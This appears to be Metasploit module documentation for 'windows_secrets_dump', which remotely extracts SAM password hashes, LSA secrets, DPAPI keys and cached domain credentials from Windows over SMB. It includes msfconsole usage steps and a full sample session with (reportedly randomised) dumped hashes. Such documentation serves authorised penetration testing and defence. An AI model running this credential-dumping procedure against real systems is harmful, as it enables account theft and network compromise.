## Vulnerable Application
### Description
The `windows_secrets_dump` auxiliary module dumps SAM hashes and LSA secrets
(including cached creds) from the remote Windows target without executing any
agent locally. First, it reads as much data as possible from the registry and
then save the hives locally on the target (%SYSTEMROOT%\\random.tmp).
Finally, it downloads the temporary hive files and reads the rest of the data
from it. These temporary files are removed when it's done.

This modules takes care of starting or enabling the Remote Registry service if
needed. It will restore the service to its original state when it's done.

This is a port of the great Impacket `secretsdump.py` code written by Alberto
Solino. Note that the `NTDS.dit` technique has not been implement yet. It will
be done in a next iteration.

### Setup
A privileged user is required to run this module, typically a local or domain
Administrator. It has been tested against multiple Windows versions, from
Windows XP/Server 2003 to Windows 10/Server version 2004.

## Verification Steps
1. Start msfconsole
2. Do: `use auxiliary/gather/windows_secrets_dump`
3. Do: `set RHOSTS <target>` (Windows host)
4. Do: `set SMBUser <username>` (privileged user)
5. Do: `set SMBDomain <domain name>` (only for domain users)
6. Do: `set SMBPass <password>`
7. Do: `run`
8. You should get the dump result displayed
9. Do: `hosts`
10. Verify the host information is there
11. Do: `services`
12. Verify the service information is there
13. Do: `creds`
14. Verify the dumped credentials are there
13. Do: `notes`
14. Verify the notes are there

## Options
Apart from the standard SMB options, no other specific options are needed.

## Scenarios
The data shown below has been altered with random data to avoid exposing
sensitive information.

### Windows 10 Version 1809
```
msf6 > use auxiliary/gather/windows_secrets_dump
msf6 auxiliary(gather/windows_secrets_dump) > options

Module options (auxiliary/gather/windows_secrets_dump):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      445              yes       The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as

msf6 auxiliary(gather/windows_secrets_dump) > set RHOSTS 192.68.43.12
RHOSTS => 192.68.43.12
msf6 auxiliary(gather/windows_secrets_dump) > set SMBUser msfuser
SMBUser => msfuser
msf6 auxiliary(gather/windows_secrets_dump) > set SMBPass mypasswd
SMBPass => mypasswd
msf6 auxiliary(gather/windows_secrets_dump) > run
[*] Running module against 192.68.43.12

[*] 192.68.43.12:445 - Service RemoteRegistry is in stopped state
[*] 192.68.43.12:445 - Starting service...
[*] 192.68.43.12:445 - Retrieving target system bootKey
[+] 192.68.43.12:445 - bootKey: 0x3d354aa5e14d4360a1cc378a9e47338c
[*] 192.68.43.12:445 - Saving remote SAM database
[*] 192.68.43.12:445 - Dumping SAM hashes
[*] 192.68.43.12:445 - Password hints:
No users with password hints on this system
[*] 192.68.43.12:445 - Password hashes (pwdump format - uid:rid:lmhash:nthash:::):
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b7759c83c817e8b0082fb322bce0073b:::
msfuser:1001:aad3b435b51404eeaad3b435b51404ee:035ad5f5a5c251c6fc3ba367bee86858:::
[*] 192.68.43.12:445 - Saving remote SECURITY database
[*] 192.68.43.12:445 - Decrypting LSA Key
[*] 192.68.43.12:445 - Dumping LSA Secrets
$MACHINE.ACC
MYDOMAIN\MYDESKTOP$:aes256-cts-hmac-sha1-96:8f84e173f9a44708b56806e3d5ee9fa4d21c8edd0da7d29d64cf6122de399b07
MYDOMAIN\MYDESKTOP$:aes128-cts-hmac-sha1-96:324719fca31fb90274acbd0bf07abf00
MYDOMAIN\MYDESKTOP$:des-cbc-md5:7561afef18d6e7bb
MYDOMAIN\MYDESKTOP$:aad3b435b51404eeaad3b435b51404ee:0cb18b83ab17e808b6604175784e8ec2:::

DPAPI_SYSTEM
dpapi_machinekey: 0xa197fe18d264c79b0996b3a987fcd6ea3b6191a6
dpapi_userkey: 0xab025408f16dc46e6ba79a559751ea4890daf97b

L$ASP.NETAutoGenKeysV44.0.30319.0
09 5a a2 cf 23 a2 09 ee 4e 55 7b e4 53 98 5c 6c    |.Z..#...NU{.S.\l|
6d cb 41 00 c8 18 4a 58 95 15 c6 56 98 fe da 79    |m.A...JX...V...y|
71 d8 43 50 6f 23 f7 0b b9 97 50 d8 b2 a4 4c c9    |q.CPo#....P...L.|
43 e6 45 23 ec ec 43 72 8c 1f 50 ad 52 a2 64 92    |C.E#..Cr..P.R.d.|
4a 03 8e be b6 fc 85 4b 65 e3 d0 c7 66 34 0b 14    |J......Ke...f4..|
13 ae e7 13 c8 25 6b f1 be 55 a4 fe de fa 4b 1d    |.....%k..U....K.|
0a f5 4d 68 ea 3c 3b 65 d1 69 eb 70 5b 7d 35 1c    |..Mh.<;e.i.p[}5.|
97 d6 e0 d1 15 65 4e 52 dc 1e 11 9e 35 6a 82 59    |.....eNR....5j.Y|
30 98 e1 d2 64 0e 2c 2b 4c dd e6 fd 02 36 21 c1    |0...d.,+L....6!.|
54 e0 18 7c e0 56 ee 25 4b ab b9 75 70 d2 cf c9    |T..|.V.%K..up...|
38 8e 06 20 31 75 ca 52 d3 9f 6d 99 80 9c f1 ab    |8.. 1u.R..m.....|
56 51 e3 de 62 be d4 bb ce f7 6b 9c f5 88 74 a7    |VQ..b.....k...t.|
54 29 51 47 3b e2 9b 7a                            |T)QG;..z|
Hex string: 095aa2cf23a209ee4e557be453985c6c6dcb4100c8184a589515c65698feda7971d843506f23f70bb99750d8b2a44cc943e64523ecec43728c1f50ad52a264924a038ebeb6fc854b65e3d0c766340b1413aee713c8256bf1be55a4fedefa4b1d0af54d68ea3c3b65d169eb705b7d351c97d6e0d115654e52dc1e119e356a82593098e1d2640e2c2b4cdde6fd023621c154e0187ce056ee254babb97570d2cfc9388e06203175ca52d39f6d99809cf1ab5651e3de62bed4bbcef76b9cf58874a7542951473be29b7a

NL$KM
40 76 27 cd 14 f9 b3 6e a5 19 fd 03 bd c7 d9 99    |@v'....n........|
f2 b0 91 78 44 80 e7 b3 7d b6 4f 26 0a 61 8c 6f    |...xD...}.O&.a.o|
c5 20 e2 65 de ef 98 13 92 e8 db c9 51 3b 5a c2    |. .e........Q;Z.|
fd 19 66 e6 e9 cd 4f 11 ec 08 82 1b 16 be 41 38    |..f...O.......A8|
Hex string: 407627cd14f9b36ea519fd03bdc7d999f2b091784480e7b37db64f260a618c6fc520e265deef981392e8dbc9513b5ac2fd1966e6e9cd4f11ec08821b16be4138

[*] 192.68.43.12:445 - Decrypting NL$KM
[*] 192.68.43.12:445 - Dumping cached hashes
[*] 192.68.43.12:445 - Hashes are in 'mscash2' format
MYDOMAIN/msfuser:$DCC2$10240#msfuser#86d8081dd11a232080037a83f2165732:MYDOMAIN.INTERNAL:MYDOMAIN

[*] 192.68.43.12:445 - Cleaning up...
[*] 192.68.43.12:445 - Stopping service RemoteRegistry...
[*] Auxiliary module execution completed
msf6 auxiliary(gather/windows_secrets_dump) > hosts

Hosts
=====

address        mac  name             os_name  os_flavor  os_sp  purpose  info  comments
-------        ---  ----             -------  ---------  -----  -------  ----  --------
192.68.43.12       MYDESKTOP  Unknown                    device

msf6 auxiliary(gather/windows_secrets_dump) > services
Services
========

host           port  proto  name  state  info
----           ----  -----  ----  -----  ----
192.68.43.12  445   tcp    smb   open   Module: auxiliary/gather/windows_secrets_dump, last negotiated version: SMBv3 (dialect = 0x0311)

msf6 auxiliary(gather/windows_secrets_dump) > creds
Credentials
===========

host          origin        service        public               private                                                                                          realm     private_type        JtR Format
----          ------        -------        ------               -------                                                                                          -----     ------------        ----------
192.68.43.12  192.68.43.12  445/tcp (smb)  MYDOMAIN\msfuser     MYDOMAIN/msfuser:$DCC2$10240#msfuser#86d8081dd11a232080037a83f2165732:MYDOMAIN.INTE (TRUNCATED)  MYDOMAIN  Nonreplayable hash  mscash2
192.68.43.12  192.68.43.12  445/tcp (smb)  Guest                aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0                                          NTLM hash           nt,lm
192.68.43.12  192.68.43.12  445/tcp (smb)  Administrator        aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0                                          NTLM hash           nt,lm
192.68.43.12  192.68.43.12  445/tcp (smb)  WDAGUtilityAccount   aad3b435b51404eeaad3b435b51404ee:b7759c83c817e8b0082fb322bce0073b                                          NTLM hash           nt,lm
192.68.43.12  192.68.43.12  445/tcp (smb)  msfuser              aad3b435b51404eeaad3b435b51404ee:035ad5f5a5c251c6fc3ba367bee86858                                          NTLM hash           nt,lm
192.68.43.12  192.68.43.12  445/tcp (smb)  MYDOMAIN\MYDESKTOP$  aad3b435b51404eeaad3b435b51404ee:0cb18b83ab17e808b6604175784e8ec2                                MYDOMAIN  NTLM hash           nt,lm
192.68.43.12  192.68.43.12  445/tcp (smb)  MYDOMAIN\MYDESKTOP$  MYDOMAIN\MYDESKTOP$:aes256-cts-hmac-sha1-96:8f84e173f9a44708b56806e3d5ee9fa4d21c8ed (TRUNCATED)  MYDOMAIN  Password
192.68.43.12  192.68.43.12  445/tcp (smb)  MYDOMAIN\MYDESKTOP$  MYDOMAIN\MYDESKTOP$:aes128-cts-hmac-sha1-96:324719fca31fb90274acbd0bf07abf00                     MYDOMAIN  Password
192.68.43.12  192.68.43.12  445/tcp (smb)  MYDOMAIN\MYDESKTOP$  MYDOMAIN\MYDESKTOP$:des-cbc-md5:7561afef18d6e7bb                                                 MYDOMAIN  Password
192.68.43.12  192.68.43.12  445/tcp (smb)  DefaultAccount       aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0                                          NTLM hash           nt,lm

msf6 auxiliary(gather/windows_secrets_dump) > notes

Notes
=====

 Time                     Host          Service  Port  Protocol  Type               Data
 ----                     ----          -------  ----  --------  ----               ----
 2020-08-13 12:20:16 UTC  192.68.43.12  smb      445   tcp       host.boot_key      "3d354aa5e14d4360a1cc378a9e47338c"
 2020-08-13 12:20:20 UTC  192.68.43.12  smb      445   tcp       host.lsa_key       "0483f343addb39221136da0a0f52397aef02e6ee5d8bd05d49390ab97e05dc45"
 2020-08-13 12:20:20 UTC  192.68.43.12  smb      445   tcp       dpapi.machine_key  "a197fe18d264c79b0996b3a987fcd6ea3b6191a6"
 2020-08-13 12:20:20 UTC  192.68.43.12  smb      445   tcp       dpapi.user_key     "ab025408f16dc46e6ba79a559751ea4890daf97b"
 2020-08-13 12:20:20 UTC  192.68.43.12  smb      445   tcp       host.nlkm_key      "40000000000000000000000000000000407627cd14f9b36ea519fd03bdc7d999f2b091784480e7b37db64f260a618c6fc520e265deef981392e8dbc9513b5ac2fd1966e6e9cd4f11ec08821b16be4138e0dd79c41522331dcc5005d731c1738f"
 2020-08-13 12:20:21 UTC  192.68.43.12  smb      445   tcp       user.cache_info    "Username: msfuser; Iteration count: 10 -> real 10240; Last login: 2020-08-01 20:00:02 +0100; DNS Domain Name: MYDOMAIN.INTERNAL; UPN: msfuser@mydomain.internal; Effective Name: msfuser; Full Name: msfuser; Logon Script: ; Profile Path: ; Home Directory: ; Home Directory Drive: ; User ID: 1004; Primary Group ID: 513; Additional groups: 513; Logon domain name: MYDOMAIN"
```
